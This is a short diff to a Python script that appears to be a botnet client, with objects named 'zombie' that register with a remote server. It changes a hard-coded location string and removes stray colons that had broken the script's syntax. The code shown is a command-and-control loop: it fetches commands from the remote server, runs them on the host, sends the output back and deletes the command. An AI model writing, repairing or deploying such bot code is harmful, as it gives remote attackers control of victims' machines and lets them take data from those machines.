@@ -160,7 +160,7 @@ def load_data(zombie):
     zombie.remote_ip = tools_data.get_remote_ip()
     zombie.local_ip = tools_data.get_local_ip()
     zombie.state = "Online"
-    zombie.location = "Argentina"
+    zombie.location = "Suecia"
 
 def build_payload(zombie):
 
@@ -196,7 +196,7 @@ if __name__ == '__main__':
 
                 if not zombie.create_connection(payload):
 
-                    zombie.update_connection(payload):
+                    zombie.update_connection(payload)
 
                     cmdline = zombie.get_command()
 
@@ -214,11 +214,11 @@ if __name__ == '__main__':
 
                             output += cmd.get_output(cmdline)
 
-                        zombie.send_output(output):
+                        zombie.send_output(output)
 
                         time.sleep(TIME_BEFORE_DELETE_COMMAND)
 
-                        zombie.delete_command():
+                        zombie.delete_command()
 
             except requests.exceptions.ConnectionError as error:
 
